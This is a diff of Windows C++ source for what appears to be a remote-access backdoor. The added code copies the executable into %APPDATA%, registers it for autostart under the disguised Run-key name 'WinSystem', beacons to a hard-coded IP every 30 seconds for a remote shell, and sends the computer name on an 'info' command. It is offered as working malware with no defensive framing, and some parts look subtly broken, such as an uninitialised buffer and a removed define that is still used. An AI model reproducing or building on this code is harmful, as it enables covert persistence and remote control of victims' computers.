@@ -1,36 +1,77 @@
+
 #include <iostream>
 #include <winsock2.h>
 #include <windows.h>
 #include <io.h>
 #include <stdio.h>
+#include <strings.h>
+#include <winnt.h>
+
+#include "main.h"
+#include "modules.h"
+
+
 using namespace std;
 
-#define PORT 15246
-#define BUFFERSIZE 256
-#define SEND 0
-#define RECV 1
-#define ERROR -1
-#define SUCCESS 0
 
-int connect_to_server(const char* addr);
-void shell_to_server(int fd);
-void command(int fd);
-int receipt_confirmation(int sock,int check);
-bool startsWith(const char *pre, const char *str);
+#define BUFSIZE 256
 
-int main()
+#define RUN_KEY_ADMIN "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define RUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+
+
+int main(int argc,char* argv[])
 {
     WSADATA WSAData;
     WSAStartup(MAKEWORD(2,0), &WSAData);
+
+    // Copy executable to appdata
+    char* appdata = getenv("APPDATA");
+    string copyEx = "copy \""+ string(argv[0]) + "\" " + appdata;
+    system(copyEx.c_str());
+
+    // Add registry key
+    std::size_t pos = strlen(argv[0]);
+    string argvzero = (string)argv[0];
+    std::string name = argvzero.substr(argvzero.find_last_of('\\', pos));
+    string path="\""+string(appdata)+name+"\"";
+    addRunEntry("WinSystem",path.c_str());
+
     while(1)
     {
         connect_to_server("192.168.1.27");
         Sleep(30000);
     }
+
     WSACleanup();
     return 0;
 }
 
+int addRunEntry(char *name, const char *path)
+{
+    HKEY key;
+    int len = strlen(path) + 1;
+    //LONG r = RegOpenKeyEx(HKEY_LOCAL_MACHINE, RUN_KEY, 0, KEY_ALL_ACCESS, &key);
+	LONG r = RegOpenKeyEx(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_ALL_ACCESS, &key);
+
+    if (r != ERROR_SUCCESS) {
+        // unable to open key for adding values.
+        return 1;
+    }
+
+    r = RegSetValueEx(key, name, 0, REG_SZ, (BYTE *)path, len);
+    if (r != ERROR_SUCCESS) {
+        RegCloseKey(key);
+        // unable to change registry value.
+        return 1;
+    }
+
+    RegCloseKey(key);
+
+    // success
+    return 0;
+}
 
 int connect_to_server(const char* addr)
 {
@@ -74,6 +115,10 @@ int connect_to_server(const char* addr)
         {
             printf("lancement de la commande sock\n");
                 command(sock);
+        }else if(strcmp(str,"info")==0)
+        {
+            printf("Recuperation des info");
+            sendInfo(sock);
         }
 
     }
@@ -125,6 +170,30 @@ void command(int fd)
     }
 
 }
+
+void sendInfo(int fd)
+{
+    std::cout<<"sendinfo():"<<std::endl;
+    const char quit_str[] ="quit: result";
+    char str[BUFFERSIZE];
+    ssize_t len;
+    strcat(str,"Computer Name :");
+    strcat(str,getComputerName());
+    len = send(fd,str,strlen(str),0);
+    if(len==-1)
+    {
+        std::cerr<<"Error send info"<<std::endl;
+        return;
+    }
+
+    len = send(fd,quit_str,strlen(quit_str),0);
+    if(len==-1)
+    {
+        std::cerr<<"Error quit str"<<std::endl;
+        return;
+    }
+}
+
 void shell_to_server(int fd)
 {
     const char prompt[]="$";
@@ -233,3 +302,4 @@ bool startsWith(const char *pre, const char *str)
            lenstr = strlen(str);
     return lenstr < lenpre ? false : strncmp(pre, str, lenpre) == 0;
 }
+
